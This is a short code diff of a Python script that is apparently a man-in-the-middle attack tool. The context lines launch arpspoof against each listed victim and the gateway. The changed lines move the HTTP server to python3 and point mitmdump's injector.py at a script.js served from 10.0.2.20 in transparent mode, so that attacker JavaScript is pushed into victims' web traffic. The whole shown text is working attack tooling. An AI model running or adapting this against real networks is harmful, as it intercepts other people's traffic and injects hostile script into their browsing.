@@ -22,10 +22,10 @@ for victim in victims:
     os.system("xterm -e arpspoof -i eth0 -t " + gateway + " " + victim + " &")
 
 # start the http server for serving the script.js, in a new console
-os.system("xterm -hold -e 'python httpServer.py' &")
+os.system("xterm -hold -e 'python3 httpServer.py' &")
 
 # start the mitmproxy
-os.system("~/.local/bin/mitmdump -s 'injector.py http://127.0.0.1:8000/script.js'")
+os.system("~/.local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T")
 
 
 '''
